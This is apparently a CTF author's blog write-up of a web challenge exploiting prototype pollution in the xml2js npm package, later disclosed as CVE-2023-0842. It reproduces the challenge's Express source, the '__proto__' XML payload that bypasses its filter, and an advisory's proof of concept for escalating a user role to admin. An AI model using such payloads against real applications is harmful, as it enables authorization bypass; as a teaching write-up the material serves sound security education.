+++
title = 'That Time My CTF Challenge Got a CVE Mid-Competition'
date = 2023-12-17
draft = false
summary = 'A short story on how a vulnerability, ignored for almost three years, is made public mid CTF making the solution to the challenge public.'
tags = ['Prototype Pollution', 'CVE', 'CTF', 'Writeup']
+++
Every year I have to create a variety of challenges for the Icelandic ECSC Qualifiers & Finals as
part of my work for the [Icelandic CTF Association](https://ggfi.is). When creating a CTF, several
aspects must be tested:

* Ensure that the perceived difficulty of the challenge is accurate.
* Check for any unintended solutions to the challenge.
* Verify that the challenge is in fact solvable.
* Confirm that the objective of the challenge is clear, i.e. not (too) guessy.

One question I didn't realize I had to ask myself when creating a CTF challenge:

> Will the CTF challenge receive a CVE and an accompanying advisory in the middle of the competition
> drastically changing the difficulty?

This year, one of my medium-difficulty challenges unexpectedly transformed into a super simple 
introductory challenge in the middle of the qualifiers. This happened because the vulnerability 
in the challenge was made public with an accompanying advisory during the competition.

## Inspiration For The Challenge
I participated in KalmarCTF in early March, one of the challenges I solved was 2cool4school. While
working on the challenge I stumbled upon a prototype pollution issue, which later turned out to be a 
dead end. Post-CTF, the challenge's source code was released, meaning I could figure out the cause
of the prototype pollution. It turned out that the prototype pollution I resided in a third-party 
npm package, `xml2js`.

Looking closer I notice that the challenge is using the latest version of the package and that the
package has over 18 million weekly downloads. Interesting, but how severe is the vulnerability? 
After playing around with the bug a bit I discover that the bug is quite limited, bummer. Turns 
out that the prototype of the object is being replaced and not modified, meaning that the inherited 
prototype of other objects are safe.

Curious to know if anyone else had flagged this concern, I searched the GitHub issues for the package.
It turns out that Dylan Katz had [reported](https://github.com/Leonidas-from-XIV/node-xml2js/issues/593) 
this issue back in 2020, and there's already a [pull request](https://github.com/Leonidas-from-XIV/node-xml2js/pull/603) from 2021 fixing the issue.

So, turns out, the bug is boring. Someone already reported it, and it seems to be a
non-issue since it hasn't been fixed. Well, at least we can make this into a somewhat interesting 
CTF challenge.

## SO Fresh SO Clean
The challenge, named *SO Fresh SO Clean*, is a rather simple web challenge. You receive a link to a
website as well as some source code. The website is a simple shopping website with seemingly no
functionality other than allowing you to add items to your cart. One of the items is a flag but if
you try to add the flag to your cart you will receive an error message stating that it is an
*Invalid item*. Let's take a look at the code:

{{< highlight JavaScript >}}
const express = require('express');
const path = require('node:path');
const bodyParser = require('body-parser');
const { readFile } = require('fs/promises');
const parseString = require('xml2js').parseString;

const app = express()
const port = 5000

app.use(express.static('static'))
app.use(bodyParser.text({ type: 'text/xml' }))

function invalidItem(item) {
    return JSON.stringify(item).includes('flag');
}

app.get('/', (req, res) => {
    res.sendFile('index.html', { root: path.join(__dirname, 'templates')});
})

app.get('/cart', async (req, res) => {
    let cartTemplate = await readFile('templates/cart.html', 'utf8');
    let html = cartTemplate.replaceAll('{{ item }}', 'Your cart is empty');
    res.setHeader('Content-Type', 'text/html');
    res.send(html);
})

app.post('/cart', async (req, res) => {
    let cart = null;
    let html = null;
    let cartTemplate = await readFile('templates/cart.html', 'utf8');
    try {
        parseString(req.body, function (err, cart) {
            if (invalidItem(cart)) {
                res.statusCode = 400;
                return res.send('Invalid item!');
            }
            if (cart.item.includes('flag')) {
                html = cartTemplate.replaceAll('{{ item }}', process.env.FLAG || 'gg{not_a_flag}');
            } else {
                html = cartTemplate.replaceAll('{{ item }}', cart.item)
            }
            res.setHeader('Content-Type', 'text/html');
            res.send(html);
        });
    } catch(e) {
        res.statusCode = 500;
        return res.send(e.message);
    }
})  

app.listen(port, () => {
    console.log(`listening on port ${port}`);
})
{{< /highlight >}}

Most of the code is just boilerplate. We can see that the main logic is in the method handling
`POST /cart`. After reading through the code, it should be clear that the objective of the challenge
is to place the `flag` item in the cart. This is because we receive the flag for the challenge if 
the cart includes the `flag` item. To get to that point we must first ensure that the call to
`invalidItem('cart')` returns false.

{{< highlight JavaScript >}}
function invalidItem(item) {
    return JSON.stringify(item).includes('flag');
}
{{< /highlight >}}

We now know that two conditions must be met:

* `JSON.stringify(item).includes('flag')` must be false.
* `cart.item.includes('flag')` must be true.

How do we achieve this?

### The Solution
When we look at the request made to `POST /cart` we can see that an XML object is being sent to the
backend:

{{< highlight XML >}}
<item>hat</item>
{{< /highlight >}}

Now looking back at the code we can see that the function used for parsing the object, `parseString`,
is imported from `xml2js`. The package's description reads:

> Simple XML to JavaScript object converter.

For some this might ring warning bells immediately as it is a classic example of how Prototype 
Pollution vulnerabilities can arise. For those unfamiliar with prototype pollution you can read 
about it [here](https://portswigger.net/web-security/prototype-pollution).

Now we want to try and pollute the prototype of the `cart` object. We do this by submitting a XML
object that looks something like this:

{{< highlight XML >}}
<__proto__><item>flag</item></__proto__>
{{< /highlight >}}

Submitting the above object would result in the flag. Why does this work? Let's take a look at
how the object differs when using `__proto__` and when we don't:

{{< highlight JavaScript >}}
// <item>flag</item>
JSON.stringify(item) // {"item": "flag"}
cart.item // "flag"

JSON.stringify(item).includes('flag') // true
cart.item.includes('flag') // true

// <__proto__><item>flag</item></__proto__>
JSON.stringify(item) // {}
cart.item // ["flag"]

JSON.stringify(item).includes('flag') // false
cart.item.includes('flag') // true
{{< /highlight >}}

The reason that `JSON.stringify(item)` returns an empty JSON object while `cart.item` returns
the item is due to the prototype being polluted. This means the actual object does not include
the `flag` item, but its prototype does. When we call `cart.item`, JavaScript won't find the value
in the object itself so JavaScript looks into the object's prototype next where it finds the item.

## CVE-2023-0842
On April 10th Fluid Attacks discloses CVE-2023-0842, a prototype pollution vulnerability affecting
`xml2js` - the same vulnerability as in the challenge. They publish an advisory which can be found
[here](https://fluidattacks.com/advisories/myers/). Reading through the advisory, we find an example
of how the package can lead to an exploitable vulnerability.

{{< highlight JavaScript >}}
var parseString = require('xml2js').parseString;

let normal_user_request    = "<role>admin</role>";
let malicious_user_request = "<__proto__><role>admin</role></__proto__>";

const update_user = (userProp) => {
    // A user cannot alter his role. This way we prevent privilege escalations.
    parseString(userProp, function (err, user) {
        if(user.hasOwnProperty("role") && user?.role.toLowerCase() === "admin") {
            console.log("Unauthorized Action");
        } else {
            console.log(user?.role[0]);
        }
    });
}

update_user(normal_user_request);
update_user(malicious_user_request);
{{< /highlight >}}

When the advisory was published, the competitors no longer needed to learn about prototype pollution 
or figure out how to solve the challenge. They could instead just search for vulnerabilities 
affecting `xml2js`, read the advisory and try out the exploit showed in the advisory. 

## Conclusion
The advisory made my introductory prototype pollution challenge into a very simple *search for the CVE*
challenge mid-competition. This could also be seen in the number of solves before and after the
advisory. Luckily this didn't change too much as people could always discover the GitHub issue from
bwolff although that would still require at least a little bit of research.

We went from discovering an unpatched vulnerability during a CTF, transforming it into a CTF challenge,
and then witnessing the vulnerability become public during the CTF competition. The coincidence of a
vulnerability that had been overlooked for almost three years getting patched and disclosed while I 
hosted a CTF challenge based on it is interesting.

## Timeline
* [2020-11-30 - bwolff reports the vulnerability on behalf of Dylan Katz](https://github.com/Leonidas-from-XIV/node-xml2js/issues/593).
* [2021-03-02 - autopulated submits a PR fixing the vulnerability](https://github.com/Leonidas-from-XIV/node-xml2js/pull/603).
* 2023-02-14 - Fluid Attacks discover the vulnerability and contact vendor.
* 2023-03-05 - I discover the vulnerability.
* 2023-03-08 - I create a challenge based on the vulnerability.
* 2023-04-01 - The Icelandic qualifiers start.
* [2023-04-07 - An issue is made on GitHub mentioning the vulnerability](https://github.com/Leonidas-from-XIV/node-xml2js/issues/663).
* 2023-04-10 - The vulnerability is disclosed.
* 2023-04-30 - The CTF ends.
